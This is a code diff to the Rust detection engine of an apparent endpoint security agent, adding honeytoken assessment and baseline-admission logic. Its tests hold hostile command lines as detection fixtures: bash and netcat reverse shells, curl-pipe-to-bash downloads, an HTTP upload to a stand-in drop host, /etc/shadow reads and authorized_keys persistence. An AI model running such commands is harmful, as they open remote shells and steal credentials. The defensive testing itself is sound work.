@@ -30,16 +30,17 @@ mod files;
 pub mod gate;
 #[cfg(target_os = "linux")] // fed only by the eBPF file-open gate
 pub mod honeytoken;
+pub mod honeytoken_policy;
 mod ioa;
 mod ioc;
 mod netscan;
 pub mod replay;
-#[cfg(any(windows, test))]
-pub mod windows_decoy;
-pub mod windows_rules;
 pub mod severity;
 pub mod sigma;
 mod stateful;
+#[cfg(any(windows, test))]
+pub mod windows_decoy;
+pub mod windows_rules;
 
 #[cfg(feature = "yara")]
 pub mod yara_scanner;
@@ -51,8 +52,8 @@ use std::time::Instant;
 use tracing::{info, warn};
 
 use crate::schema::{
-    AgentEvent, CorrelationKeys, DetectionData, DetectionMode, EventAction, EventClass,
-    EventData, PtraceData, SetuidData, Severity,
+    AgentEvent, CorrelationKeys, DetectionData, DetectionMode, EventAction, EventClass, EventData,
+    PtraceData, SetuidData, Severity,
 };
 
 use ioa::ProcContext;
@@ -323,17 +324,6 @@ impl DetectionEngine {
                         &mut out,
                     );
                 }
-                #[cfg(windows)]
-                if self
-                    .anomaly_enabled
-                    .load(std::sync::atomic::Ordering::Relaxed)
-                {
-                    if let Ok(mut baseline) = self.baseline.lock() {
-                        if let Some(d) = baseline.observe_exec(&p.username, &p.exe, now) {
-                            out.push(self.detection(Severity::Info, d));
-                        }
-                    }
-                }
             }
             EventData::ProcessExec(p) => {
                 self.ebpf_exec_seen.store(true, Relaxed);
@@ -348,18 +338,6 @@ impl DetectionEngine {
                 if let Some(ref ld_preload) = p.ld_preload {
                     if let Some(d) = behavior::inspect_ld_preload(&p.comm, &p.exe, ld_preload) {
                         out.push(self.detection(Severity::Info, d));
-                    }
-                }
-                // Statistical behavioural baseline (config-gated): per-user
-                // binary novelty + exec-rate z-score, learned online.
-                if self
-                    .anomaly_enabled
-                    .load(std::sync::atomic::Ordering::Relaxed)
-                {
-                    if let Ok(mut b) = self.baseline.lock() {
-                        if let Some(d) = b.observe_exec(&p.username, &p.exe, now) {
-                            out.push(self.detection(Severity::Info, d));
-                        }
                     }
                 }
             }
@@ -412,9 +390,10 @@ impl DetectionEngine {
             }
             EventData::UserLogon(l) => {
                 let src = l.src_addr.as_deref().unwrap_or("");
-                let hit = self.stateful.lock().ok().and_then(|mut st| {
-                    st.observe_logon(&l.username, src, l.success, elapsed_secs)
-                });
+                let hit =
+                    self.stateful.lock().ok().and_then(|mut st| {
+                        st.observe_logon(&l.username, src, l.success, elapsed_secs)
+                    });
                 if let Some(d) = hit {
                     out.push(self.detection(Severity::Info, d));
                 }
@@ -483,6 +462,35 @@ impl DetectionEngine {
         for ev in out.iter_mut() {
             self.finalize(ev, Some(event), ctx);
         }
+        // Inspect deterministic evidence first. A suspicious execution cannot
+        // authorize its own admission to the learned normal baseline.
+        if self.anomaly_enabled.load(Relaxed) {
+            let actor = match &event.data {
+                EventData::ProcessExec(p) => Some((&p.username, &p.exe)),
+                EventData::ProcessCreate(p) if !self.ebpf_exec_seen.load(Relaxed) => {
+                    Some((&p.username, &p.exe))
+                }
+                _ => None,
+            };
+            if let Some((user, exe)) = actor {
+                let eligible = out
+                    .iter()
+                    .all(|e| !matches!(&e.data, EventData::Detection(d) if d.confidence >= 50));
+                if let Ok(mut baseline) = self.baseline.lock() {
+                    if let Some(d) = baseline.observe_exec_at(
+                        user,
+                        exe,
+                        now,
+                        event.timestamp.timestamp().max(0) as u64,
+                        eligible,
+                    ) {
+                        let mut finding = self.detection(Severity::Info, d);
+                        self.finalize(&mut finding, Some(event), ctx);
+                        out.push(finding);
+                    }
+                }
+            }
+        }
         out
     }
 
@@ -515,7 +523,25 @@ impl DetectionEngine {
     /// Admit a detection a collector raised directly (memory scan, rootkit,
     /// filesystem, honeytokens): enrich it from the process tree, finalise its
     /// severity and gate it like an engine finding.
-    pub fn admit_external(&self, mut event: AgentEvent) -> Vec<gate::Emitted> {
+    pub fn admit_external(&self, event: AgentEvent) -> Vec<gate::Emitted> {
+        self.admit_external_at(event, Instant::now())
+    }
+
+    pub fn admit_external_at(&self, mut event: AgentEvent, now: Instant) -> Vec<gate::Emitted> {
+        if let EventData::HoneytokenAccess(data) = &mut event.data {
+            let outcome = honeytoken_policy::assess(data, event.severity);
+            event.severity = outcome.severity;
+            data.mode = Some(outcome.mode);
+            if matches!(
+                data.access_kind.as_str(),
+                "modify" | "unlink" | "rename" | "hardlink" | "exec"
+            ) {
+                data.confidence = data.confidence.max(90);
+            }
+            data.assessment_reasons = outcome.reasons;
+            // Raw accesses remain individual forensic evidence. Backend folds alerts.
+            return self.admit_at(vec![event], now);
+        }
         if let EventData::Detection(d) = &event.data {
             let pid = d
                 .evidence
@@ -542,7 +568,7 @@ impl DetectionEngine {
             }
             self.finalize(&mut event, None, ctx.as_ref());
         }
-        self.admit(vec![event])
+        self.admit_at(vec![event], now)
     }
 
     /// Aggregate updates that are due (or everything pending, on shutdown).
@@ -560,7 +586,12 @@ impl DetectionEngine {
 
     /// Stamp a finding with correlation keys, catalog metadata, the severity
     /// policy's verdict and its dedup key.
-    fn finalize(&self, ev: &mut AgentEvent, trigger: Option<&AgentEvent>, ctx: Option<&ProcContext>) {
+    fn finalize(
+        &self,
+        ev: &mut AgentEvent,
+        trigger: Option<&AgentEvent>,
+        ctx: Option<&ProcContext>,
+    ) {
         let emitted_severity = ev.severity;
         let EventData::Detection(d) = &mut ev.data else {
             return;
@@ -584,7 +615,10 @@ impl DetectionEngine {
             fill(&mut c.parent_key, ctx.parent_key.clone());
             fill(&mut c.root_key, ctx.root_key.clone());
             fill(&mut c.pid, Some(ctx.pid));
-            fill(&mut c.user, Some(ctx.username.clone()).filter(|u| !u.is_empty()));
+            fill(
+                &mut c.user,
+                Some(ctx.username.clone()).filter(|u| !u.is_empty()),
+            );
             fill(&mut c.exe, Some(ctx.exe.clone()).filter(|e| !e.is_empty()));
             fill(&mut c.exe_sha256, ctx.exe_hash.clone());
             fill(&mut c.container_id, ctx.container_id.clone());
@@ -769,8 +803,18 @@ impl DetectionEngine {
         const PTRACE_ATTACH: u32 = 16;
         const PTRACE_SEIZE: u32 = 0x4206;
         const CRED_HOLDERS: &[&str] = &[
-            "sshd", "sudo", "su", "passwd", "login", "gnome-keyring-d", "ssh-agent", "gpg-agent",
-            "systemd-logind", "polkitd", "vault", "keepassxc",
+            "sshd",
+            "sudo",
+            "su",
+            "passwd",
+            "login",
+            "gnome-keyring-d",
+            "ssh-agent",
+            "gpg-agent",
+            "systemd-logind",
+            "polkitd",
+            "vault",
+            "keepassxc",
         ];
         if p.request != PTRACE_ATTACH && p.request != PTRACE_SEIZE {
             return;
@@ -813,10 +857,33 @@ impl DetectionEngine {
         // The setuid-root binaries whose whole purpose is to become root; a
         // finding per `sudo` would bury everything else.
         const SANCTIONED: &[&str] = &[
-            "sudo", "su", "passwd", "pkexec", "newgrp", "chsh", "chfn", "gpasswd", "mount",
-            "umount", "fusermount", "fusermount3", "unix_chkpwd", "ssh-keysign", "polkit-agent-he",
-            "dbus-daemon-lau", "Xorg", "crontab", "at", "doas", "sshd", "login", "cron", "systemd",
-            "snap-confine", "chrome-sandbox", "ping",
+            "sudo",
+            "su",
+            "passwd",
+            "pkexec",
+            "newgrp",
+            "chsh",
+            "chfn",
+            "gpasswd",
+            "mount",
+            "umount",
+            "fusermount",
+            "fusermount3",
+            "unix_chkpwd",
+            "ssh-keysign",
+            "polkit-agent-he",
+            "dbus-daemon-lau",
+            "Xorg",
+            "crontab",
+            "at",
+            "doas",
+            "sshd",
+            "login",
+            "cron",
+            "systemd",
+            "snap-confine",
+            "chrome-sandbox",
+            "ping",
         ];
         if SANCTIONED.contains(&s.comm.as_str()) {
             return;
@@ -1101,14 +1168,20 @@ fn entities_from_event(ev: &AgentEvent, c: &mut CorrelationKeys) {
             fill(&mut c.pid, Some(p.pid));
             fill(&mut c.exe, Some(p.exe.clone()).filter(|e| !e.is_empty()));
             fill(&mut c.exe_sha256, p.exe_sha256.clone());
-            fill(&mut c.user, Some(p.username.clone()).filter(|u| !u.is_empty()));
+            fill(
+                &mut c.user,
+                Some(p.username.clone()).filter(|u| !u.is_empty()),
+            );
             fill(&mut c.container_id, p.container_id.clone());
         }
         EventData::ProcessCreate(p) => {
             fill(&mut c.pid, Some(p.pid));
             fill(&mut c.exe, Some(p.exe.clone()).filter(|e| !e.is_empty()));
             fill(&mut c.exe_sha256, p.exe_sha256.clone());
-            fill(&mut c.user, Some(p.username.clone()).filter(|u| !u.is_empty()));
+            fill(
+                &mut c.user,
+                Some(p.username.clone()).filter(|u| !u.is_empty()),
+            );
         }
         EventData::NetworkConnection(n) => {
             fill(&mut c.pid, n.pid);
@@ -1117,7 +1190,10 @@ fn entities_from_event(ev: &AgentEvent, c: &mut CorrelationKeys) {
         }
         EventData::NetworkSocket(n) => {
             fill(&mut c.pid, Some(n.pid));
-            fill(&mut c.user, Some(n.username.clone()).filter(|u| !u.is_empty()));
+            fill(
+                &mut c.user,
+                Some(n.username.clone()).filter(|u| !u.is_empty()),
+            );
             if n.op == "connect" || n.op == "accept" {
                 fill(&mut c.remote_ip, Some(n.addr.clone()));
                 fill(&mut c.remote_port, Some(n.port));
@@ -1129,7 +1205,10 @@ fn entities_from_event(ev: &AgentEvent, c: &mut CorrelationKeys) {
         EventData::FileOpen(f) => {
             fill(&mut c.pid, Some(f.pid));
             fill(&mut c.file_path, Some(f.path.clone()));
-            fill(&mut c.user, Some(f.username.clone()).filter(|u| !u.is_empty()));
+            fill(
+                &mut c.user,
+                Some(f.username.clone()).filter(|u| !u.is_empty()),
+            );
         }
         EventData::FileRename(r) => {
             fill(&mut c.pid, Some(r.pid));
@@ -1157,7 +1236,10 @@ fn entities_from_evidence(evidence: &serde_json::Value, c: &mut CorrelationKeys)
     fill(&mut c.domain, s("domain"));
     fill(
         &mut c.pid,
-        evidence.get("pid").and_then(|v| v.as_i64()).map(|p| p as i32),
+        evidence
+            .get("pid")
+            .and_then(|v| v.as_i64())
+            .map(|p| p as i32),
     );
 }
 
@@ -1337,6 +1419,30 @@ mod tests {
             started: Instant::now(),
             clock_bits: std::sync::atomic::AtomicU64::new(0),
             rule_modes: RwLock::new(std::collections::HashMap::new()),
+        }
+    }
+
+    #[test]
+    fn honeytoken_assessment_vectors_reach_external_admission() {
+        let cases: serde_json::Value = serde_json::from_str(include_str!(
+            "../../tests/fixtures/honeytoken-assessment-vectors.json"
+        ))
+        .unwrap();
+        for case in cases.as_array().unwrap() {
+            let data = serde_json::from_value(case["data"].clone()).unwrap();
+            let event = AgentEvent::new(
+                "a".into(),
+                "h".into(),
+                crate::schema::EventClass::Detection,
+                crate::schema::EventAction::HoneytokenAccess,
+                Severity::Critical,
+                EventData::HoneytokenAccess(Box::new(data)),
+            );
+            let out = engine().admit_external(event);
+            assert_eq!(out.len(), 1, "{}", case["name"]);
+            let wire = serde_json::to_value(&out[0].event).unwrap();
+            assert_eq!(wire["severity"], case["severity"], "{}", case["name"]);
+            assert_eq!(wire["data"]["mode"], case["mode"], "{}", case["name"]);
         }
     }
 
@@ -1595,43 +1701,110 @@ mod tests {
         assert_eq!(c.exe.as_deref(), Some("/usr/bin/cat"));
         assert_eq!(ev.severity, Severity::Medium, "catalog base, no modifiers");
         assert_eq!(d.mode, Some(DetectionMode::Alert));
-        assert!(d.dedup_key.as_deref().unwrap().starts_with("creds.shadow_read:"));
+        assert!(d
+            .dedup_key
+            .as_deref()
+            .unwrap()
+            .starts_with("creds.shadow_read:"));
         assert!(d.context_flags.contains(&"ssh_session".to_string()));
     }
 
     #[test]
     fn web_lineage_raises_and_package_manager_lowers() {
         let e = engine();
-        e.inspect(&exec(10, 1, 33, "nginx", "/usr/sbin/nginx", "nginx: worker"));
+        e.inspect(&exec(
+            10,
+            1,
+            33,
+            "nginx",
+            "/usr/sbin/nginx",
+            "nginx: worker",
+        ));
         let out = e.inspect(&exec(11, 10, 33, "sh", "/bin/sh", "sh -c id"));
         let ev = find(&out, "exec.webserver_shell").expect("web shell fires");
         assert_eq!(ev.severity, Severity::Critical, "High base + web lineage");
 
         let e = engine();
-        e.inspect(&exec(20, 1, 0, "apt-get", "/usr/bin/apt-get", "apt-get install x"));
-        e.inspect(&exec(21, 20, 0, "dpkg", "/usr/bin/dpkg", "dpkg --configure"));
-        let out = e.inspect(&exec(22, 21, 0, "sh", "/bin/sh", "sh -c curl -fsSL https://x/install.sh | bash"));
+        e.inspect(&exec(
+            20,
+            1,
+            0,
+            "apt-get",
+            "/usr/bin/apt-get",
+            "apt-get install x",
+        ));
+        e.inspect(&exec(
+            21,
+            20,
+            0,
+            "dpkg",
+            "/usr/bin/dpkg",
+            "dpkg --configure",
+        ));
+        let out = e.inspect(&exec(
+            22,
+            21,
+            0,
+            "sh",
+            "/bin/sh",
+            "sh -c curl -fsSL https://x/install.sh | bash",
+        ));
         let ev = find(&out, "lolbin.download_pipe_shell").expect("still reported");
-        assert_eq!(ev.severity, Severity::Low, "Medium base - package manager lineage");
+        assert_eq!(
+            ev.severity,
+            Severity::Low,
+            "Medium base - package manager lineage"
+        );
     }
 
     #[test]
     fn agent_and_its_children_are_never_inspected() {
         let mut e = engine();
         e.self_pid = 4242;
-        e.inspect(&exec(4242, 1, 0, "trapd-agent", "/opt/trapd/trapd-agent", "trapd-agent"));
-        let out = e.inspect(&exec(4243, 4242, 0, "sh", "/bin/sh", "sh -c cat /etc/shadow"));
+        e.inspect(&exec(
+            4242,
+            1,
+            0,
+            "trapd-agent",
+            "/opt/trapd/trapd-agent",
+            "trapd-agent",
+        ));
+        let out = e.inspect(&exec(
+            4243,
+            4242,
+            0,
+            "sh",
+            "/bin/sh",
+            "sh -c cat /etc/shadow",
+        ));
         assert!(out.is_empty());
-        let out = e.inspect(&exec(4244, 4243, 0, "cat", "/usr/bin/cat", "cat /etc/shadow"));
-        assert!(out.is_empty(), "grandchildren of the agent are its own activity too");
+        let out = e.inspect(&exec(
+            4244,
+            4243,
+            0,
+            "cat",
+            "/usr/bin/cat",
+            "cat /etc/shadow",
+        ));
+        assert!(
+            out.is_empty(),
+            "grandchildren of the agent are its own activity too"
+        );
     }
 
     #[test]
     fn proc_poll_duplicate_of_an_ebpf_exec_is_not_inspected() {
         let e = engine();
         assert_eq!(
-            e.inspect(&exec(50, 1, 0, "bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
-                .len(),
+            e.inspect(&exec(
+                50,
+                1,
+                0,
+                "bash",
+                "/bin/bash",
+                "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
+            ))
+            .len(),
             1
         );
         let poll = proc_event("bash", "/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1");
@@ -1690,7 +1863,10 @@ mod tests {
         );
         let out = e.inspect(&res);
         let ev = find(&out, "ioc.dns_domain").expect("domain IOC fires on the resolved name");
-        assert_eq!(det_of(ev).correlation.as_ref().unwrap().domain.as_deref(), Some("c2.evil.test"));
+        assert_eq!(
+            det_of(ev).correlation.as_ref().unwrap().domain.as_deref(),
+            Some("c2.evil.test")
+        );
     }
 
     #[test]
@@ -1721,12 +1897,24 @@ mod tests {
         e.inspect(&exec(100, 1, 0, "sshd", "/usr/sbin/sshd", "sshd: u"));
         e.inspect(&exec(200, 100, 1000, "bash", "/bin/bash", "-bash"));
         let mut hits = Vec::new();
-        for (pid, c) in [(201, "id"), (202, "whoami"), (203, "uname"), (204, "hostname")] {
+        for (pid, c) in [
+            (201, "id"),
+            (202, "whoami"),
+            (203, "uname"),
+            (204, "hostname"),
+        ] {
             hits.extend(e.inspect(&exec(pid, 200, 1000, c, &format!("/usr/bin/{c}"), c)));
         }
         let burst = find(&hits, "discovery.recon_burst").expect("burst fires");
         assert_eq!(det_of(burst).mode, Some(DetectionMode::Signal));
-        let up = e.inspect(&exec(205, 200, 1000, "curl", "/usr/bin/curl", "curl -T /tmp/a.tgz https://drop.example.net/"));
+        let up = e.inspect(&exec(
+            205,
+            200,
+            1000,
+            "curl",
+            "/usr/bin/curl",
+            "curl -T /tmp/a.tgz https://drop.example.net/",
+        ));
         let ex = find(&up, "exfil.http_upload").unwrap();
         assert_eq!(
             det_of(burst).correlation.as_ref().unwrap().root_key,
@@ -1739,7 +1927,11 @@ mod tests {
     fn file_events_replace_command_line_persistence() {
         let e = engine();
         let cmd = "bash -c echo key >> /root/.ssh/authorized_keys";
-        assert!(find(&e.inspect(&exec(80, 1, 0, "bash", "/bin/bash", cmd)), "persistence.ssh_authorized_keys").is_some());
+        assert!(find(
+            &e.inspect(&exec(80, 1, 0, "bash", "/bin/bash", cmd)),
+            "persistence.ssh_authorized_keys"
+        )
+        .is_some());
         let open = AgentEvent::new(
             "a".into(),
             "h".into(),
@@ -1759,17 +1951,33 @@ mod tests {
         let out = e.inspect(&open);
         let ev = find(&out, "persistence.ssh_authorized_keys").expect("file rule fires");
         assert_eq!(
-            det_of(ev).correlation.as_ref().unwrap().file_path.as_deref(),
+            det_of(ev)
+                .correlation
+                .as_ref()
+                .unwrap()
+                .file_path
+                .as_deref(),
             Some("/root/.ssh/authorized_keys")
         );
         // From now on the command-line guess for the same rule is dropped.
-        assert!(find(&e.inspect(&exec(82, 1, 0, "bash", "/bin/bash", cmd)), "persistence.ssh_authorized_keys").is_none());
+        assert!(find(
+            &e.inspect(&exec(82, 1, 0, "bash", "/bin/bash", cmd)),
+            "persistence.ssh_authorized_keys"
+        )
+        .is_none());
     }
 
     #[test]
     fn collector_detections_are_finalised_and_gated() {
         let e = engine();
-        e.inspect(&exec(90, 1, 0, "java", "/usr/bin/java", "java -jar app.jar"));
+        e.inspect(&exec(
+            90,
+            1,
+            0,
+            "java",
+            "/usr/bin/java",
+            "java -jar app.jar",
+        ));
         let mem = e.detection(
             Severity::High,
             DetectionData {
@@ -1788,7 +1996,10 @@ mod tests {
         let d = det_of(&out[0].event);
         assert!(d.correlation.as_ref().unwrap().process_key.is_some());
         assert!(d.evidence.get("process_lineage").is_some());
-        assert!(e.admit_external(mem).is_empty(), "same process, same finding");
+        assert!(
+            e.admit_external(mem).is_empty(),
+            "same process, same finding"
+        );
     }
 
     #[test]
@@ -1849,19 +2060,40 @@ mod tests {
         let e = engine();
         *e.sigma.write().unwrap() = sigma;
         let native_cases = [
-            ("bash", "/usr/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+            (
+                "bash",
+                "/usr/bin/bash",
+                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            ),
             ("bash", "/usr/bin/bash", "bash -c curl http://x/i.sh | bash"),
             ("cat", "/usr/bin/cat", "cat /etc/shadow"),
-            ("python3", "/usr/bin/python3", "python3 -c import socket;s=socket.socket();s.connect(('1.2.3.4',1))"),
+            (
+                "python3",
+                "/usr/bin/python3",
+                "python3 -c import socket;s=socket.socket();s.connect(('1.2.3.4',1))",
+            ),
         ];
         for (i, (comm, exe, cmd)) in native_cases.iter().enumerate() {
             let out = e.inspect(&exec(500 + i as i32, 1, 0, comm, exe, cmd));
-            let sigma_hits = out.iter().filter(|ev| det_of(ev).category == "sigma").count();
+            let sigma_hits = out
+                .iter()
+                .filter(|ev| det_of(ev).category == "sigma")
+                .count();
             assert!(!out.is_empty(), "native rule fires for {cmd}");
-            assert_eq!(sigma_hits, 0, "a sample Sigma rule duplicates the native finding for {cmd}");
+            assert_eq!(
+                sigma_hits, 0,
+                "a sample Sigma rule duplicates the native finding for {cmd}"
+            );
         }
         // And they still add coverage of their own.
-        let out = e.inspect(&exec(600, 1, 0, "nc", "/usr/bin/nc", "nc 10.0.0.1 4444 -e /bin/sh"));
+        let out = e.inspect(&exec(
+            600,
+            1,
+            0,
+            "nc",
+            "/usr/bin/nc",
+            "nc 10.0.0.1 4444 -e /bin/sh",
+        ));
         assert_eq!(
             out.iter().any(|ev| det_of(ev).category == "sigma"),
             cfg!(target_os = "linux"),
